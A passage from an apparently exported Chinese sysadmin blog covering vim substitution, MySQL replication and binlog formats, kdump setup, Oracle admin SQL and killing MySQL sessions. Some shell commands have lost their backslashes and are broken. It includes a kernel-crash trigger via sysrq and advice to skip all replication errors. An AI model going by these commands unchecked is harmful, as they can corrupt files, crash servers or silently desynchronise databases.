为数字，若 n 为 .，表示从当前行开始到最后一行</div><div class="line"></div><div class="line">　　:%s/vivian/sky/(等同于 :g/vivian/s//sky/) 替换每一行的第一个 vivian 为 sky</div><div class="line"></div><div class="line">　　:%s/vivian/sky/g(等同于 :g/vivian/s//sky/g) 替换每一行中所有 vivian 为 sky</div><div class="line"></div><div class="line">　　可以使用 # 作为分隔符，此时中间出现的 / 不会作为分隔符</div><div class="line"></div><div class="line">　　:s#vivian/#sky/# 替换当前行第一个 vivian/ 为 sky/</div><div class="line"></div><div class="line">　　:%s+/oradata/apras/+/user01/apras1+ (使用+ 来 替换 / )： /oradata/apras/替换成/user01/apras1/</div><div class="line"></div><div class="line">　　* ************************************</div><div class="line"></div><div class="line">　　1.:s/vivian/sky/ 替换当前行第一个 vivian 为 sky</div><div class="line"></div><div class="line">　　:s/vivian/sky/g 替换当前行所有 vivian 为 sky</div><div class="line"></div><div class="line">　　2. :n,$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky</div><div class="line"></div><div class="line">　　:n,$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky</div><div class="line"></div><div class="line">　　(n 为数字，若 n 为 .，表示从当前行开始到最后一行)</div><div class="line"></div><div class="line">　　3. :%s/vivian/sky/(等同于 :g/vivian/s//sky/) 替换每一行的第一个 vivian 为 sky</div><div class="line"></div><div class="line">　　:%s/vivian/sky/g(等同于 :g/vivian/s//sky/g) 替换每一行中所有 vivian 为 sky</div><div class="line"></div><div class="line">　　4. 可以使用 # 作为分隔符，此时中间出现的 / 不会作为分隔符</div><div class="line"></div><div class="line">　　:s#vivian/#sky/# 替换当前行第一个 vivian/ 为 sky/</div><div class="line"></div><div class="line">　　5. 删除文本中的^M</div><div class="line"></div><div class="line">　　问题描述：对于换行,window下用回车换行(0A0D)来表示，[Linux](http://net.zdnet.com.cn/files/list-0-0-102937-1-1.htm)下是回车(0A)来表示。这样，将window上的文件拷到unix上用时，总会有个^M.请写个用在unix下的过滤windows文件的换行符(0D)的shell或c程序。</div><div class="line"></div><div class="line">　　· 使用命令：cat filename1 | tr -d “^V^M” &amp;gt;newfile;</div><div class="line"></div><div class="line">　　· 使用命令：sed -e “s/^V^M//” filename &amp;gt;outputfilename。需要注意的是在1、2两种方法中，^V和^M指的是Ctrl+V和Ctrl+M。你必须要手工进行输入，而不是粘贴。</div><div class="line"></div><div class="line">　　· 在vi中处理：首先使用vi打开文件，然后按ESC键，接着输入命令：%s/^V^M//。</div><div class="line"></div><div class="line">　　· :%s/^M$//g</div><div class="line"></div><div class="line">　　如果上述方法无用，则正确的解决办法是：</div><div class="line"></div><div class="line">　　· tr -d &quot;r&quot; &amp;lt;src &amp;gt;dest</div><div class="line"></div><div class="line">　　· tr -d &quot;5&quot; dest</div><div class="line"></div><div class="line">　　· strings A&amp;gt;B</div><div class="line"></div><div class="line">　　6. 其它</div><div class="line"></div><div class="line">　　利用 :s 命令可以实现字符串的替换。具体的用法包括：</div><div class="line"></div><div class="line">　　:s/str1/str2/ 用字符串 str2 替换行中首次出现的字符串 str1</div><div class="line"></div><div class="line">　　:s/str1/str2/g 用字符串 str2 替换行中所有出现的字符串 str1</div><div class="line"></div><div class="line">　　:.,$ s/str1/str2/g 用字符串 str2 替换正文当前行到末尾所有出现的字符串 str1</div><div class="line"></div><div class="line">　　:1,$ s/str1/str2/g 用字符串 str2 替换正文中所有出现的字符串 str1</div><div class="line"></div><div class="line">　　:g/str1/s//str2/g 功能同上</div><div class="line"></div><div class="line">　　从上述替换命令可以看到：g 放在命令末尾，表示对搜索字符串的每次出现进行替换;不加 g，表示只对搜索</div><div class="line"></div><div class="line">　　字符串的首次出现进行替换;g 放在命令开头，表示对正文中所有包含搜索字符串的行进行替换操作。</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 脚本开发 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql查看所有存储过程查询]]></title>
      <url>/2012/07/13/mysql-select-all-proc.html</url>
      <content type="html"><![CDATA[<p>查询数据库中的存储过程</p>
<p>方法一：<br><code>select</code>name<code>from mysql.proc where db = &#39;your_db_name&#39; and</code>type<code>= &#39;PROCEDURE&#39;;</code></p>
<p>方法二：<br><code>show procedure status;</code></p>
<p>查看存储过程或函数的创建代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">show create procedure proc_name;</div><div class="line">show create function func_name;</div></pre></td></tr></table></figure></p>
<p>方法三：使用Navicat客户端工具</p>
<p>查看在某个库下创建的存储过程，就去查看函数选项即可，支持编辑修改！</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql slave不能同步Error 'Duplicate entry '1438019' for key 'PRIMARY'' on query]]></title>
      <url>/2012/07/09/mysql-slave-duplicate-primary.html</url>
      <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show slave statusG;</div><div class="line">*************************** 1. row ***************************</div><div class="line">               Slave_IO_State: Waiting for master to send event</div><div class="line">                  Master_Host: 192.168.10.100</div><div class="line">                  Master_User: slave_user</div><div class="line">                  Master_Port: 3306</div><div class="line">                  Connect_Retry: 60</div><div class="line">                  Master_Log_File: mysql-bin.000773</div><div class="line">                  Read_Master_Log_Pos: 63325</div><div class="line">                  Relay_Log_File: server122-relay-bin.000002</div><div class="line">                  Relay_Log_Pos: 165661</div><div class="line">                  Relay_Master_Log_File: mysql-bin.000771</div><div class="line">                  Slave_IO_Running: Yes</div><div class="line">                  Slave_SQL_Running: No</div><div class="line">                  Replicate_Do_DB:</div><div class="line">                  Replicate_Ignore_DB:</div><div class="line">                  Replicate_Do_Table:</div><div class="line">                  Replicate_Ignore_Table:</div><div class="line">                  Replicate_Wild_Do_Table:</div><div class="line">                  Replicate_Wild_Ignore_Table:</div><div class="line">                   Last_Errno: 1062</div><div class="line">                   Last_Error: Error &apos;Duplicate entry &apos;1438019&apos; for key &apos;PRIMARY&apos;&apos; on query. Default database: &apos;otrs&apos;. Query: &apos;INSERT INTO ticket (tn, title, create_time_unix, queue_id, ticket_lock_id,  user_id, group_id, ticket_priority_id, ticket_state_id, ticket_answered,  escalation_start_time, timeout, valid_id, create_time, create_by, change_time, change_by)  VALUES (&apos;2012061310001851&apos;, &apos;Your order  ORD201205A000016 was bounced back&apos;, 1339585744, 44, 1, 43,  1, 3, 4,  0, 1339585744, 0, 1,  current_timestamp, 43, current_timestamp, 43)&apos;</div><div class="line">                 Skip_Counter: 0</div><div class="line">                 Exec_Master_Log_Pos: 41969067</div><div class="line">                 Relay_Log_Space: 625695</div><div class="line">                 Until_Condition: None</div><div class="line">                 Until_Log_File:</div><div class="line">                 Until_Log_Pos: 0</div><div class="line">                 Master_SSL_Allowed: No</div><div class="line">                 Master_SSL_CA_File:</div><div class="line">                 Master_SSL_CA_Path:</div><div class="line">                 Master_SSL_Cert:</div><div class="line">                 Master_SSL_Cipher:</div><div class="line">                 Master_SSL_Key:</div><div class="line">                 Seconds_Behind_Master: NULL</div><div class="line">                 Master_SSL_Verify_Server_Cert: No</div><div class="line">                Last_IO_Errno: 0</div><div class="line">                Last_IO_Error:</div><div class="line">                Last_SQL_Errno: 1062</div><div class="line">                Last_SQL_Error: Error &apos;Duplicate entry &apos;1438019&apos; for key &apos;PRIMARY&apos;&apos; on query. Default database: &apos;otrs&apos;. Query: &apos;INSERT INTO ticket (tn, title, create_time_unix, queue_id, ticket_lock_id,  user_id, group_id, ticket_priority_id, ticket_state_id, ticket_answered,  escalation_start_time, timeout, valid_id, create_time, create_by, change_time, change_by)  VALUES (&apos;2012061310001851&apos;, &apos;Your order  ORD201205A000016 was bounced back&apos;, 1339585744, 44, 1, 43,  1, 3, 4,  0, 1339585744, 0, 1,  current_timestamp, 43, current_timestamp, 43)&apos;</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure>
<h4 id="分析原因"><a href="#分析原因" class="headerlink" title="分析原因"></a>分析原因</h4><p>重复插入相同的记录，造成的主键冲突问题</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>如果较少的错误可以手动解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">slave stop;</div><div class="line">set global sql_slave_skip_counter=n; \ n=正整数，，看你的错误有几条，就跳过几条  </div><div class="line">slave start;</div></pre></td></tr></table></figure></p>
<p>较多的情况下增加slave_skip_errors = 1062 参数<br>my.cnf 中增加slave_skip_errors = 1062 参数，忽略1062错误，若忽略多个错误，中间用逗号隔开，忽略所有用all</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL binlog_format (Mixed,Statement,Row)区别和使用场合]]></title>
      <url>/2012/07/06/mysql-binlog-format.html</url>
      <content type="html"><![CDATA[<p>MySQL 5.5 中对于二进制日志 (binlog) 有 3 种不同的格式可选：Mixed,Statement,Row，默认格式是 Statement。总结一下这三种格式日志的优缺点。</p>
<p>MySQL Replication 复制可以是基于一条语句 (Statement Level) ，也可以是基于一条记录 (Row Level)，可以在 MySQL 的配置参数中设定这个复制级别，不同复制级别的设置会影响到 Master 端的 bin-log 日志格式。</p>
<h4 id="Row"><a href="#Row" class="headerlink" title="Row"></a>Row</h4><p>日志中会记录成每一行数据被修改的形式，然后在 slave 端再对相同的数据进行修改。</p>
<p><strong>优点</strong>：在 row 模式下，bin-log 中可以不记录执行的 SQL 语句的上下文相关的信息，仅仅只需要记录那一条记录被修改了，修改成什么样了。所以 row 的日志内容会非常清楚的记录下每一行数据修改的细节，非常容易理解。而且不会出现某些特定情况下的存储过程或 function ，以及 trigger 的调用和触发无法被正确复制的问题。</p>
<p><strong>缺点</strong>：在 row 模式下，所有的执行的语句当记录到日志中的时候，都将以每行记录的修改来记录，这样可能会产生大量的日志内容，比如有这样一条 update 语句：</p>
<p><code>UPDATE product SET owner_member_id = &#39;b&#39; WHERE owner_member_id = &#39;a&#39;</code></p>
<p>执行之后，日志中记录的不是这条 update 语句所对应的事件 (MySQL 以事件的形式来记录 bin-log 日志) ，而是这条语句所更新的每一条记录的变化情况，这样就记录成很多条记录被更新的很多个事件。自然，bin-log 日志的量就会很大。尤其是当执行 alter table 之类的语句的时候，产生的日志量是惊人的。因为 MySQL 对于 alter table 之类的表结构变更语句的处理方式是整个表的每一条记录都需要变动，实际上就是重建了整个表。那么该表的每一条记录都会被记录到日志中。</p>
<h4 id="Statement"><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h4><p>每一条会修改数据的 SQL 都会记录到 master 的 bin-log 中。slave 在复制的时候 SQL 进程会解析成和原来 master 端执行过的相同的 SQL 再次执行。</p>
<p><strong>优点</strong>：在 statement 模式下，首先就是解决了 row 模式的缺点，不需要记录每一行数据的变化，减少了 bin-log 日志量，节省 I/O 以及存储资源，提高性能。因为他只需要记录在 master 上所执行的语句的细节，以及执行语句时候的上下文的信息。</p>
<p><strong>缺点</strong>：在 statement 模式下，由于他是记录的执行语句，所以，为了让这些语句在 slave 端也能正确执行，那么他还必须记录每条语句在执行的时候的一些相关信息，也就是上下文信息，以保证所有语句在 slave 端杯执行的时候能够得到和在 master 端执行时候相同的结果。另外就是，由于 MySQL 现在发展比较快，很多的新功能不断的加入，使 MySQL 的复制遇到了不小的挑战，自然复制的时候涉及到越复杂的内容，bug 也就越容易出现。在 statement 中，目前已经发现的就有不少情况会造成 MySQL 的复制出现问题，主要是修改数据的时候使用了某些特定的函数或者功能的时候会出现，比如：sleep() 函数在有些版本中就不能被正确复制，在存储过程中使用了 last_insert_id() 函数，可能会使 slave 和 master 上得到不一致的 id 等等。由于 row 是基于每一行来记录的变化，所以不会出现类似的问题。</p>
<h4 id="Mixed"><a href="#Mixed" class="headerlink" title="Mixed"></a>Mixed</h4><p>从官方文档中看到，之前的 MySQL 一直都只有基于 statement 的复制模式，直到 5.1.5 版本的 MySQL 才开始支持 row 复制。从 5.0 开始，MySQL 的复制已经解决了大量老版本中出现的无法正确复制的问题。但是由于存储过程的出现，给 MySQL Replication 又带来了更大的新挑战。另外，看到官方文档说，从 5.1.8 版本开始，MySQL 提供了除 Statement 和 Row 之外的第三种复制模式：Mixed，实际上就是前两种模式的结合。在 Mixed 模式下，MySQL 会根据执行的每一条具体的 SQL 语句来区分对待记录的日志形式，也就是在 statement 和 row 之间选择一种。新版本中的 statment 还是和以前一样，仅仅记录执行的语句。而新版本的 MySQL 中对 row 模式也被做了优化，并不是所有的修改都会以 row 模式来记录，比如遇到表结构变更的时候就会以 statement 模式来记录，如果 SQL 语句确实就是 update 或者 delete 等修改数据的语句，那么还是会记录所有行的变更。</p>
<p><strong>其他参考信息</strong></p>
<p><strong>除以下几种情况外，在运行时可以动态改变 binlog 的格式</strong>：<br>. 存储流程或者触发器中间；<br>. 启用了 NDB；<br>. 当前会话使用 row 模式，并且已打开了临时表；</p>
<p><strong>如果 binlog 采用了 Mixed 模式，那么在以下几种情况下会自动将 binlog 的模式由 statement 模式变为 row 模式</strong>：<br>. 当 DML 语句更新一个 NDB 表时；<br>. 当函数中包含 UUID() 时；<br>. 2 个及以上包含 AUTO_INCREMENT 字段的表被更新时；<br>. 执行 INSERT DELAYED 语句时；<br>. 用 UDF 时；<br>. 视图中必须要求运用 row 时，例如建立视图时使用了 UUID() 函数；</p>
<p><strong>设定主从复制模式</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">log-bin=mysql-bin</div><div class="line">#binlog_format=&quot;STATEMENT&quot;</div><div class="line">#binlog_format=&quot;ROW&quot;</div><div class="line">binlog_format=&quot;MIXED&quot;</div></pre></td></tr></table></figure></p>
<p><strong>也可以在运行时动态修改 binlog 的格式。例如</strong>：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; SET SESSION binlog_format = &apos;STATEMENT&apos;;</div><div class="line">mysql&gt; SET SESSION binlog_format = &apos;ROW&apos;;</div><div class="line">mysql&gt; SET SESSION binlog_format = &apos;MIXED&apos;;</div><div class="line">mysql&gt; SET GLOBAL binlog_format = &apos;STATEMENT&apos;;</div><div class="line">mysql&gt; SET GLOBAL binlog_format = &apos;ROW&apos;;</div><div class="line">mysql&gt; SET GLOBAL binlog_format = &apos;MIXED&apos;;&lt;/pre&gt;</div></pre></td></tr></table></figure></p>
<p><strong>两种模式的对比</strong>：<br><strong>Statement 优点</strong><br>历史悠久，技术成熟；<br>产生的 binlog 文件较小；<br>binlog 中包含了所有数据库修改信息，可以据此来审核数据库的安全等情况；<br>binlog 可以用于实时的还原，而不仅仅用于复制；<br>主从版本可以不一样，从服务器版本可以比主服务器版本高；</p>
<p><strong>Statement 缺点</strong>：<br>不是所有的 UPDATE 语句都能被复制，尤其是包含不确定操作的时候；<br>调用具有不确定因素的 UDF 时复制也可能出现问题；<br>运用以下函数的语句也不能被复制：</p>
<ul>
<li>LOAD_FILE()</li>
<li>UUID()</li>
<li>USER()</li>
<li>FOUND_ROWS()</li>
<li>SYSDATE() (除非启动时启用了 –sysdate-is-now 选项)<br>INSERT … SELECT 会产生比 RBR 更多的行级锁；<br>复制须要执行全表扫描 (WHERE 语句中没有运用到索引) 的 UPDATE 时，须要比 row 请求更多的行级锁；<br>对于有 AUTO_INCREMENT 字段的 InnoDB 表而言，INSERT 语句会阻塞其他 INSERT 语句；<br>对于一些复杂的语句，在从服务器上的耗资源情况会更严重，而 row 模式下，只会对那个发生变化的记录产生影响；<br>存储函数(不是存储流程 )在被调用的同时也会执行一次 NOW() 函数，这个可以说是坏事也可能是好事；<br>确定了的 UDF 也须要在从服务器上执行；<br>数据表必须几乎和主服务器保持一致才行，否则可能会导致复制出错；<br>执行复杂语句如果出错的话，会消耗更多资源；</li>
</ul>
<p><strong>Row 优点</strong><br>任何情况都可以被复制，这对复制来说是最安全可靠的；<br>和其他大多数数据库系统的复制技能一样；<br>多数情况下，从服务器上的表如果有主键的话，复制就会快了很多；<br>复制以下几种语句时的行锁更少：</p>
<ul>
<li>INSERT … SELECT</li>
<li>包含 AUTO_INCREMENT 字段的 INSERT</li>
<li>没有附带条件或者并没有修改很多记录的 UPDATE 或 DELETE 语句<br>执行 INSERT，UPDATE，DELETE 语句时锁更少；<br>从服务器上采用多线程来执行复制成为可能；</li>
</ul>
<p><strong>Row 缺点</strong><br>生成的 binlog 日志体积大了很多；<br>复杂的回滚时 binlog 中会包含大量的数据；<br>主服务器上执行 UPDATE 语句时，所有发生变化的记录都会写到 binlog 中，而 statement 只会写一次，这会导致频繁发生 binlog 的写并发请求；<br>UDF 产生的大 BLOB 值会导致复制变慢；<br>不能从 binlog 中看到都复制了写什么语句(加密过的)；<br>当在非事务表上执行一段堆积的 SQL 语句时，最好采用 statement 模式，否则很容易导致主从服务器的数据不一致情况发生；<br>另外，针对系统库 MySQL 里面的表发生变化时的处理准则如下：<br>如果是采用 INSERT，UPDATE，DELETE 直接操作表的情况，则日志格式根据 binlog_format 的设定而记录；<br>如果是采用 GRANT，REVOKE，SET PASSWORD 等管理语句来做的话，那么无论如何都要使用 statement 模式记录；<br>使用 statement 模式后，能处理很多原先出现的主键重复问题；</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[/usr/local/lib/libltdl.a(ltdl.o): could not read symbols: Bad value]]></title>
      <url>/2012/06/28/libltdl-error.html</url>
      <content type="html"><![CDATA[<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>在编译libmcrypt软件包时出现问题<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/libltdl.a(ltdl.o): relocation R_X86_64_32S against `a local symbol&apos; can not be used when making a shared object; recompile with -fPIC</div><div class="line">/usr/local/lib/libltdl.a(ltdl.o): could not read symbols: Bad value</div><div class="line">collect2: ld returned 1 exit status</div><div class="line">make: *** [libphp4.la] Error 1</div></pre></td></tr></table></figure></p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum install libtool-ltdl-devel</div><div class="line">//PHP_LDFLAGS=-L/usr/lib64 ./build php n</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[启动 centos5.6出现下面提示 Memory for crash kernel (0x0 to 0x0 notwithin permissible range)]]></title>
      <url>/2012/06/25/centos56-kernel-crash.html</url>
      <content type="html"><![CDATA[<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>启动 centos5.6出现下面提示 Memory for crash kernel (0x0 to 0x0 notwithin permissible range)</p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>kexec是一个快速启动机制，允许通过已经运行的内核的上下文启动一个Linux内核，不需要经过BIOS。BIOS可能会消耗很多时间，特别是带有众多数量的外设的大型服务器。这种办法可以为经常启动机器的开发者节省很多时间。<br>kdump是一个新的，而且非常可信赖的内核崩溃转储机制。崩溃转储数据可以从一个新启动的内核的上下文中获取，而不是从已经崩溃的内核的上下文。当系统崩溃时，kdump使用kexec启动到第二个内核。第二个内核通常叫做捕获内核（capture kernel），以很小内存启动，并且捕获转储镜像。<br>第一个内核保留了内存的一部分，第二个内核可以用来启动。注意，在启动时，kdump保留了一定数量的重要的内存，这改变了紅帽企业Linux 5最小内存需求。为了计算系统需要的真正最小内存，可以参看 [url]<a href="http://www.redhat.com/rhel/details/limits/[/url" target="_blank" rel="external">http://www.redhat.com/rhel/details/limits/[/url</a>] 上列出的最小内存需求，加上kdump使用的内存数量，以决定真正的最小内存的需求。</p>
<p>因为第一内核的内存内容已经被保留，所以kexec可以不经过BIOS，启动捕获内核。这是内核崩溃转储的根本。</p>
<h5 id="怎样配置kdump"><a href="#怎样配置kdump" class="headerlink" title="怎样配置kdump"></a>怎样配置kdump</h5><ol>
<li><p>确认kexec-tools已经安装：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#rpm -q kexec-tools</div></pre></td></tr></table></figure>
</li>
<li><p>配置/etc/kdump.conf文件，指定vmcore将被转储的路径。可以通过scp拷贝到另一个服务器，也可以是裸设备，或者本地的文件系统。</p>
</li>
<li><p>修改一些启动参数，为捕获很保留一块内存。对于i386和x86_64架构，编辑/etc/grub.conf，在内核行的末尾添加 crashkernel=128@16M。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">下面是一个带有kdump选项的/etc/grub.conf文件：</div><div class="line"></div><div class="line"># grub.conf generated by anaconda</div><div class="line">#</div><div class="line"># Note that you do not have to rerun grub after making changes to this file</div><div class="line"># NOTICE:  You do not have a /boot partition.  This means that</div><div class="line">#          all kernel and initrd paths are relative to /, eg.</div><div class="line">#          root (hd0,0)</div><div class="line">#          kernel /boot/vmlinuz-version ro root=/dev/hda1</div><div class="line">#          initrd /boot/initrd-version.img</div><div class="line">#boot=/dev/hda</div><div class="line">default=0</div><div class="line">timeout=5</div><div class="line">splashimage=(hd0,0)/boot/grub/splash.xpm.gz</div><div class="line">hiddenmenu</div><div class="line">title Red Hat Enterprise Linux Client (2.6.17-1.2519.4.21.el5)</div><div class="line">        root (hd0,0)</div><div class="line">        kernel /boot/vmlinuz-2.6.17-1.2519.4.21.el5 ro root=LABEL=/ rhgb quiet crashkernel=128M@16M</div><div class="line">        initrd /boot/initrd-2.6.17-1.2519.4.21.el5.img</div></pre></td></tr></table></figure>
</li>
</ol>
<p>4.修改之后，重启系统。128M内存（从16M开始）不被正常的系统使用，为捕获内核保留。注意，free -m的输出会显示内存比不加参数时少了128M，这就是我们所期望的。</p>
<p>注意：可以使用小于128M，但是只使用64M做测试被证实是不可靠的。</p>
<p>5.现在，保留内存已经设置了，打开kdump初始脚本，启动服务：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#  chkconfig kdump on</div><div class="line">#  service kdump start</div></pre></td></tr></table></figure></p>
<p>6.可以通过kexec加载内核镜像，让系统准备捕获一个崩溃时产生的vmcore。可以通过sysrq强制系统崩溃：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># echo &quot;c&quot; &amp;gt; /proc/sysrq-trigger</div></pre></td></tr></table></figure></p>
<p>这造成kernel panic，紧跟着系统重启kdump内核。当启动进程进入到启动kdump服务器时，vmcore将会被拷贝到你在/etc/kdump.conf文件中指定的位置。</p>
<p>注意：</p>
<p>终端frame-buffer和X将运行不正常。在运行一些类似于在内核配置上添加了”vga=791”或者运行X的系统，在通过kexec启动内核时，终端显示将不清楚。记住，kdump内核仍旧能够创建转储。当系统重启，显示将会恢复到正常状态。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Oracle常用查询sql]]></title>
      <url>/2012/06/15/oracle-sql.html</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">select * from v$version;                查看服务器版本</div><div class="line">select * from all_users;                ##查看所有用户</div><div class="line">select name from v$database;            ##查看当前数据库</div><div class="line">database test;                          ##进入test数据库</div><div class="line">select * from v$instance;               ##查看所有的数据库实例</div><div class="line">shutdown immediate                      ##关闭数据库</div><div class="line">alter user sys identified by new_password;        ##更改用户密码</div><div class="line">select username,password from dba_users;          ##查看当实例中的用户和密码</div><div class="line">show parameter control_files;                     ## 查看控制文件;</div><div class="line">select member from v$logfile;                     ##查看日志文件</div><div class="line">show parameter ;                                  ## 查看数据库参数</div><div class="line">select * from user_role_privs;                    ##查看当前用户的角色</div><div class="line">select username,default_tablespace from user_users; ##查看当前用户的缺省表空间</div><div class="line">alter user system identified by [password]        ##修改用户的密码</div><div class="line">ALTER USER &quot;SCOTT&quot; ACCOUNT UNLOCK                 ##解锁SCOTT用户</div><div class="line">show parameter processes;                         ##查看最大会话数</div><div class="line"></div><div class="line">select username,sid,serial# from v$session;  查看当前会话连接</div><div class="line"></div><div class="line">select * from all_tables;                         ##查看当前库的所有数据表</div><div class="line"></div><div class="line">查看表结构：desc all_tables;</div><div class="line"></div><div class="line">创建用户并赋予权限</div><div class="line">###----------------------------创建用户并赋予权限------------------------------------####-</div><div class="line">create user mpss</div><div class="line">    identified by &quot;mpss12&quot;</div><div class="line">    default tablespace TS_MPSS_DATA</div><div class="line">    temporary tablespace TEMP;</div><div class="line"></div><div class="line">给用户赋予权限</div><div class="line">grant connect to mpss;</div><div class="line">grant resource,create session to mpss;  开发角色</div><div class="line">grant create procedure to dbuser；＃这些权限足够用于开发及生产环境</div><div class="line"></div><div class="line">给用户授权</div><div class="line">grant dba to spms;--授予DBA权限</div><div class="line">grant unlimited tablespace to lxg;--授予不限制的表空间</div><div class="line">grant select any table to lxg;--授予查询任何表</div><div class="line">grant select any dictionary to lxg;--授予 查询任何字典</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[批量杀死MySQL连接的几种方法]]></title>
      <url>/2012/06/14/batch-kill-mysql-proccess.html</url>
      <content type="html"><![CDATA[<p>方法一:<br>　　通过information_schema.processlist表中的连接信息生成需要处理掉的MySQL连接的语句临时文件，然后执行临时文件中生成的指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat(&apos;KILL &apos;,id,&apos;;&apos;) from information_schema.processlist where user=&apos;root&apos;;</div><div class="line">+------------------------+</div><div class="line">| concat(&apos;KILL &apos;,id,&apos;;&apos;) |</div><div class="line">+------------------------+</div><div class="line">| KILL 3101;             |</div><div class="line">| KILL 2946;             |</div><div class="line">+------------------------+</div><div class="line">2 rows in set (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt; select concat(&apos;KILL &apos;,id,&apos;;&apos;) from information_schema.processlist where user=&apos;root&apos; into outfile &apos;/tmp/a.txt&apos;;</div><div class="line">Query OK, 2 rows affected (0.00 sec)</div><div class="line"></div><div class="line">mysql&gt;source /tmp/a.txt;</div><div class="line">Query OK, 0 rows affected (0.00 sec)</div></pre></td></tr></table></figure></p>
